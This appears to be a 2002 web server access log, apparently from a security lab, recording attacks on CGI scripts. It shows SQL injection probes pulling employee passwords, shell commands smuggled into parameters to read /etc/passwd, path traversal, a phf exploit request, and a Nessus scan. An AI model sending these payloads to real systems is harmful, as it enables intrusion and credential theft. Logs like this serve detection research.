128.111.43.73 - - [06/Dec/2002:12:23:45 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27 HTTP/1.0" 200 293 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:23:54 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.0" 200 1238 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.25 - - [06/Dec/2002:12:24:14 -0800] "GET /cgi-bin/save_message.pl?last=gfas%3bcat%20%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 690 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.32 - - [06/Dec/2002:12:24:19 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3B+select+pass+as+extension+from+Employees+where+last%3D%27 HTTP/1.1" 200 417 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.73 - - [06/Dec/2002:12:24:23 -0800] "GET /cgi-bin/query_extension.pl?cboname=Leo HTTP/1.0" 200 307 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.73 - - [06/Dec/2002:12:24:38 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.0" 200 1238 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:24:41 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27%3B+select+password+as+extension+from+Employees+where+last%3D%27 HTTP/1.1" 200 425 "http://128.111.48.15/contact.html" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.25 - - [06/Dec/2002:12:24:56 -0800] "GET /cgi-bin/query_extension.pl?cboname=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 200 353 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.32 - - [06/Dec/2002:12:25:00 -0800] "GET /contact.html HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.61 - - [06/Dec/2002:12:25:00 -0800] "GET /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd" 404 - "-" "-"
128.111.43.32 - - [06/Dec/2002:12:25:05 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.73 - - [06/Dec/2002:12:25:10 -0800] "GET /cgi-bin/query_extension.pl?cboname=John HTTP/1.0" 200 309 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:25:14 -0800] "" 501 - "-" "-"
128.111.43.65 - - [06/Dec/2002:12:25:14 -0800] "" 501 - "-" "-"
128.111.43.73 - - [06/Dec/2002:12:25:19 -0800] "GET /cgi-bin/query_extension.pl?cboname=John%27 HTTP/1.0" 200 301 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:25:19 -0800] "€." 501 - "-" "-"
128.111.43.65 - - [06/Dec/2002:12:25:19 -0800] "GET / HTTP/1.0" 200 1494 "-" "-"
128.111.43.73 - - [06/Dec/2002:12:25:28 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27--%27 HTTP/1.0" 200 1238 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-17.7.x i686)"
128.111.43.65 - - [06/Dec/2002:12:25:29 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.25 - - [06/Dec/2002:12:25:29 -0800] "GET /cgi-bin/query_extension.pl?%0a/* HTTP/1.1" 200 313 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /NessusTest1343235826.html HTTP/1.1" 404 297 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /NessusTest1343235826.cgi HTTP/1.1" 404 296 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /NessusTest1343235826.sh HTTP/1.1" 404 295 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /NessusTest1343235826.pl HTTP/1.1" 404 295 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /NessusTest1343235826.inc HTTP/1.1" 404 296 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /NessusTest1343235826.shtml HTTP/1.1" 404 298 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
128.111.43.65 - - [06/Dec/2002:12:25:42 -0800] "GET /cgi-bin/NessusTest1343235826.html HTTP/1.1" 404 305 "-" "Mozilla/4.75 [en] (X11, U; Nessus)"
